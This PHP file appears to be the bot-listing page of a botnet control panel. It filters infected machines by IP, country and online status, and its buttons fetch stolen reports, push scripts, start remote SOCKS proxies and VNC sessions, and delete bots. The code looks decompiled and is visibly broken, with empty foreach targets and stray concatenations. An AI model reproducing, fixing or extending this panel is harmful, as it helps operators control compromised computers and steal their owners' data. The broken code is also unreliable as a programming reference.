<?php


if (!defined('__CP__')) {
	exit();
}

include_once __DIR__ . '/../gate/libs/Api.php';
@define('BOTS_PER_PAGE', $config['row_limit'] ? $config['row_limit'] : 50);
define('BOTSLIST_ROWS_COUNT', 11);
$fullQuery = QUERY_STRING;
$filter['bots'] = isset($_GET['bots']) ? $_GET['bots'] : '';
$filter['botnets'] = isset($_GET['botnets']) ? $_GET['botnets'] : '';
$filter['ips'] = isset($_GET['ips']) ? $_GET['ips'] : '';
$filter['countries'] = isset($_GET['countries']) ? $_GET['countries'] : '';

if (is_array($filter['countries'])) {
	$filter['countries'] = trim(implode(' ', $filter['countries']));
}

$filter['nat'] = 0;

if (!isset($_GET['ips'])) {
	$filter['online'] = 1;
}
else {
	$filter['online'] = isset($_GET['online']) && defined('__CP__') ? 1 : 0;
}

$filter['new'] = isset($_GET['new']) && defined('__CP__') ? 1 : 0;
$filter['used'] = isset($_GET['used']) ? intval($_GET['used']) : 0;
$filter['comment'] = 0;
$filter['tags'] = isset($_REQUEST['tags']) ? $_REQUEST['tags'] : '';

foreach ($filter as $i => ) {
	$k = defined('__CP__');
	$fullQuery .= '&' . $k . '=' . urlencode($i);
}

$fullQuery .= assocateSortMode(array('bot_id', 'botnet', 'bot_version', 'ipv4', 'country', 'rtime_online', 'net_latency', 'comment'));
$jsSort = addJsSlashes($fullQuery);
$jsPage = addJsSlashes($fullQuery);
$jsScript = jsCheckAll('botslist', 'checkall', 'bots[]') . jsSetSortMode($jsSort) .  . 'function changePage(p){window.location=\'' . $jsPage . '&page=\' + p; return false;}';
$q = array();

if (0 < $filter['nat']) {
	$q[] = 'LOCATE(`ipv4`, `ipv4_list`)' . ($filter['nat'] == 1 ? '>' : '=') . '0';
}

if (0 < $filter['new']) {
	$q[] = '`flag_new`=' . ($filter['new'] == 1 ? 1 : 0);
}

if (0 < $filter['used']) {
	$q[] = '`flag_used`=' . ($filter['used'] == 1 ? 1 : 0);
}

if (0 < $filter['online']) {
	$q[] = '`rtime_last`' . ($filter['online'] == 1 ? '>=' : '<') . ONLINE_TIME_MIN;
}

if (0 < $filter['comment']) {
	$q[] = 'LENGTH(`comment`)' . ($filter['comment'] == 1 ? '>' : '=') . '0';
}

if ((strpos($filter['bots'], '/') !== false) && defined('__CP__')) {
	$q[] = expressionToSql($extractId, '`bot_id`', 0, 1);
}
else {
	$q[] = expressionToSql($filter['bots'], '`bot_id`', 0, 1);
}

$q[] = expressionToSql($filter['botnets'], '`botnet`', 0, 1);
$q[] = expressionToSql($filter['ips'], 'CONCAT_WS(\'.\', ORD(SUBSTRING(`ipv4`, 1, 1)), ORD(SUBSTRING(`ipv4`, 2, 1)), ORD(SUBSTRING(`ipv4`, 3, 1)), ORD(SUBSTRING(`ipv4`, 4, 1)))', 0, 1);
$q[] = expressionToSql($filter['countries'], '`country`', 0, 1);

if ($sub = tagsToQuery($filter['tags'])) {
	$q[] = $sub;
}

foreach ($q as $v => ) {
	$k = defined('__CP__');

	if ($v == '') {
		unset($q[$k]);
	}
}

$query1 = (0 < count($q) ? 'WHERE ' . implode(' AND ', $q) : '');
$query2 = $query1 . ' ORDER BY ' . $_sortColumn . ($_sortOrder == 0 ? ' ASC' : ' DESC');

if ($_sortColumnId != 0) {
	$query2 .= ', `bot_id`' . ($_sortOrder == 0 ? ' ASC' : ' DESC');
}

unset($q);
$curPage = (!empty($_GET['page']) && defined('__CP__') ? $_GET['page'] : 1);
$pageCount = 0;
$pageList = '';
$botsCount = 0;
$r = mysqlQueryEx('botnet_list', 'SELECT COUNT(*) FROM `botnet_list` ' . $query1);

if ($mt = @mysql_fetch_row($r)) {
	if (1 < ($pageCount = ceil($mt[0] / BOTS_PER_PAGE))) {
		$pageList = THEME_DIALOG_ROW_BEGIN . str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN) . showPageList($pageCount, $curPage, 'return changePage({P})') . THEME_DIALOG_ITEM_CHILD_END . THEME_DIALOG_ROW_END;
	}

	$botsCount = $mt[0];
}

$botsList = '';
$offset = ($curPage - 1) * BOTS_PER_PAGE;
if (!$r || defined('__CP__') || defined('__CP__')) {
	$botsList .= THEME_LIST_ROW_BEGIN . str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(BOTSLIST_ROWS_COUNT, $r ? LNG_BOTNET_LIST_EMPTY : mysqlErrorEx()), THEME_LIST_ITEM_EMPTY_1) . THEME_LIST_ROW_END;
}
else {
	$i = 0;

	while ($mt = @mysql_fetch_array($r)) {
		$ipv4 = binaryIpToString($mt[4]);
		$themeText = ($i % 2 ? THEME_LIST_ITEM_LTEXT_U2 : THEME_LIST_ITEM_LTEXT_U1);
		$themeNum = ($i % 2 ? THEME_LIST_ITEM_RTEXT_U2 : THEME_LIST_ITEM_RTEXT_U1);
		$themeCb = ($i % 2 ? THEME_LIST_ITEM_INPUT_CHECKBOX_1_U2 : THEME_LIST_ITEM_INPUT_CHECKBOX_1_U1);
		$newcomment = '<a target="_blank" href="?botsaction=fullinfo&bots[]=' . htmlspecialchars($mt[0]) . '&setcomment=1" title="' . htmlspecialchars($mt['newcomment']) . '" class="glyphicon glyphicon-' . (strlen($mt['newcomment']) ? 'comment' : 'pencil') . ' acomment"></a>';
		$botsList .= THEME_LIST_ROW_BEGIN . str_replace(array('{NAME}', '{VALUE}', '{JS_EVENTS}'), array('bots[]', htmlEntitiesEx($mt[0]), ''), $themeCb) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', botPopupMenu($mt[0], 'botmenu')), $themeText) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlEntitiesEx($mt[1])), $themeText) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', intToVersion($mt[2])), $themeText) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $ipv4), $themeText) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlEntitiesEx($mt[5])), $themeText) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $mt[7] == 1 ? tickCountToText(CURRENT_TIME - $mt[6]) : LNG_FORMAT_NOTIME), $themeNum) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', numberFormatAsFloat($mt[8] / 1000, 3)), $themeNum) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', empty($mt[9]) ? '-' : '<div style="overflow: hidden; height: 20px; width: 50px">' . htmlEntitiesEx($mt[9]) . '</div>'), $themeText) . '<td><a class="' . ($mt['flag_used'] ? 'simplered' : '') . '" href=# onclick="updateChused(\'' . htmlspecialchars($mt[0]) . '\', this)">' . ($mt['flag_used'] ? 'Reset used' : 'Set used') . '</a></td>' . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $newcomment), $themeText) . THEME_LIST_ROW_END;
		$i++;
	}
}

$actions = $actionsNew = '';
if (((0 < $pageCount) || defined('__CP__')) && defined('__CP__')) {
	$actionsNew = '<tr><td>' . '<input type="hidden" name="botsaction" value="" id="actionName">' . '<input type="submit" class="btn btn-primary btn-sm" value="Full information" onclick="document.getElementById(\'actionName\').value=\'fullinfo\';">&nbsp;' . '<input type="submit" class="btn btn-primary btn-sm" value="Today data" onclick="document.getElementById(\'actionName\').value=\'today_dbreports\';">&nbsp;' . '<input type="submit" class="btn btn-primary btn-sm" value="Data for last week" onclick="document.getElementById(\'actionName\').value=\'week_dbreports\';">&nbsp;' . '<input type="submit" class="btn btn-primary btn-sm" value="Look data in reports" onclick="document.getElementById(\'actionName\').value=\'files\';">&nbsp;' . '<input type="submit" class="btn btn-primary btn-sm" value="Script" onclick="document.getElementById(\'actionName\').value=\'newscript\';">&nbsp;' . '<input type="submit" class="btn btn-danger btn-sm" value="Del bot" onclick="document.getElementById(\'actionName\').value=\'removeex\';">&nbsp;' . '<div style="margin-top: 5px">' . '<input type="submit" class="btn btn-success btn-sm" value="Activate socks" onclick="document.getElementById(\'actionName\').value=\'activate_socks\';">&nbsp;' . '<input type="submit" class="btn btn-success btn-sm" value="Activate vnc" onclick="document.getElementById(\'actionName\').value=\'activate_vnc\';">&nbsp;' . '<input type="submit" class="btn btn-success btn-sm" value="Get socks" onclick="document.getElementById(\'actionName\').value=\'port_socks\';">&nbsp;' . '<input type="submit" class="btn btn-success btn-sm" value="Get VNC" onclick="document.getElementById(\'actionName\').value=\'port_vnc\';">&nbsp;' . '<input type="submit" class="btn btn-success btn-sm" value="Stop socks" onclick="document.getElementById(\'actionName\').value=\'stop_socks\';">&nbsp;' . '<input type="submit" class="btn btn-success btn-sm" value="Stop vnc" onclick="document.getElementById(\'actionName\').value=\'stop_vnc\';">&nbsp;' . '</div><br></td></tr>';
}

define('INPUT_WIDTH', '100%');
define('SELECT_WIDTH', '100%');
$filterHtml = "\n" . '<b>Filters</b><br>' . "\n" . '<form class="form-group-sm" id="filter" style="margin-top: 5px">' . "\n" . '  <input type="hidden" name="m" value="botnet_bots" />' . '<span>Bots:</span>' . str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array('100%', 'bots', htmlEntitiesEx($filter['bots']), 512), THEME_DIALOG_ITEM_INPUT_TEXT) . '<span>Botnets:</span>' . makeSelectItem('botnets', getBotnetList(), is_array($filter['botnets']) ? implode(' ', $filter['botnets']) : $filter['botnets'], false, false, 'ms_botnet') . '<span>IP-addresses:</span>' . str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array('100%', 'ips', htmlEntitiesEx($filter['ips']), 512), THEME_DIALOG_ITEM_INPUT_TEXT) . '<span>Countries:</span>' . makeSelectItem('countries', getCountriesList(), $filter['countries'], false, false, 'ms_country') . str_replace('{TEXT}', LNG_BOTNET_FILTER_USED, THEME_DIALOG_ITEM_TEXT) . str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN) . str_replace(array('{NAME}', '{WIDTH}'), array('used', SELECT_WIDTH), THEME_DIALOG_ITEM_LISTBOX_BEGIN) . str_replace(array('{VALUE}', '{TEXT}'), array(0, LNG_BOTNET_FILTER_ALL), $filter['used'] == 0 ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM) . str_replace(array('{VALUE}', '{TEXT}'), array(1, LNG_BOTNET_FILTER_USED_TRUE), $filter['used'] == 1 ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM) . str_replace(array('{VALUE}', '{TEXT}'), array(2, LNG_BOTNET_FILTER_USED_FALSE), $filter['used'] == 2 ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM) . THEME_DIALOG_ITEM_LISTBOX_END . THEME_DIALOG_ITEM_CHILD_END . str_replace('{TEXT}', 'Online:', THEME_DIALOG_ITEM_TEXT) . str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN) . str_replace(array('{NAME}', '{WIDTH}'), array('online', SELECT_WIDTH), THEME_DIALOG_ITEM_LISTBOX_BEGIN) . str_replace(array('{VALUE}', '{TEXT}'), array(0, 'All'), !$filter['online'] ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM) . str_replace(array('{VALUE}', '{TEXT}'), array(1, 'Online'), $filter['online'] ? THEME_DIALOG_ITEM_LISTBOX_ITEM_CUR : THEME_DIALOG_ITEM_LISTBOX_ITEM) . THEME_DIALOG_ITEM_LISTBOX_END . THEME_DIALOG_ITEM_CHILD_END . '<span>Tags:</span>' . str_replace(array('{WIDTH}', '{NAME}', '{VALUE}', '{MAX}'), array('100%', 'tags', htmlEntitiesEx($filter['tags']), 512), THEME_DIALOG_ITEM_INPUT_TEXT) . '<br>' . "\n" . '<input type="submit" value="Search" class="btn btn-primary btn-sm" />' . "\n" . '<input type="button" class="btn btn-danger btn-sm" value="Reset form" onclick="location.href=\'?m=botnet_bots\'" />' . addSortModeToForm() . "\n" . '</form>';

if ($botsCount) {
	ThemeBegin(LNG_BOTNET, $jsScript, getBotJsMenu('botmenu'), 0, $filterHtml, false, '', true);
	echo str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('botslist', QUERY_SCRIPT_HTML, ''), THEME_FORMGET_TO_NEW_BEGIN_POST) . '<div class="top-fixed">' . $actionsNew . sprintf(LNG_BOTNET_LIST, numberFormatAsInt($botsCount)) . '<br><br></div><div style="height: 119px"></div>' . str_replace('{WIDTH}', 'auto', THEME_DIALOG_BEGIN) . $pageList . THEME_DIALOG_ROW_BEGIN . str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN) . str_replace('{WIDTH}', '100%', THEME_LIST_BEGIN) . THEME_LIST_ROW_BEGIN . str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{JS_EVENTS}', '{WIDTH}'), array(1, 'checkall', 1, ' onclick="checkAll()"', 'auto'), THEME_LIST_HEADER_CHECKBOX_1) . writeSortColumn(LNG_BOTNET_LIST_BOTID, 0, 0) . writeSortColumn(LNG_BOTNET_LIST_BOTNET, 1, 0) . writeSortColumn(LNG_BOTNET_LIST_VERSION, 2, 0) . writeSortColumn(LNG_BOTNET_LIST_IPV4, 3, 0) . writeSortColumn(LNG_BOTNET_LIST_CONTRY, 4, 0) . writeSortColumn(LNG_BOTNET_LIST_ONLINETIME, 5, 1) . writeSortColumn(LNG_BOTNET_LIST_LATENCY, 6, 1) . writeSortColumn(LNG_BOTNET_LIST_COMMENT, 7, 0) . str_replace(array('{COLUMNS_COUNT}', '{TEXT}', '{WIDTH}'), array(1, '', 'auto'), THEME_LIST_HEADER_R) . str_replace(array('{COLUMNS_COUNT}', '{TEXT}', '{WIDTH}'), array(1, '', 'auto'), THEME_LIST_HEADER_R) . THEME_LIST_ROW_END . $botsList . THEME_LIST_END . THEME_DIALOG_ITEM_CHILD_END . THEME_DIALOG_ROW_END . THEME_DIALOG_END . THEME_FORMGET_END;
}
else {
	ThemeBegin(LNG_BOTNET, $jsScript, getBotJsMenu('botmenu'), 0, $filterHtml, false, '', false);
	echo 'Search for bots in <span class="label-rightmenu">right menu</span>';
}

echo '<script type="text/javascript" src="theme/bootstrap-multiselect.js"></script>' . "\n" . '<script type="text/javascript">' . "\n" . '    $(document).ready(function() {' . "\n" . '        $(\'#ms_country\').multiselect({includeSelectAllOption: true, buttonWidth: \'209px\', maxHeight: 200});' . "\n" . '        $(\'#ms_botnet\').multiselect({includeSelectAllOption: true, buttonWidth: \'209px\', maxHeight: 200});' . "\n" . '    });' . "\n" . '</script>' . "\n";
ThemeEnd();
exit();

?>
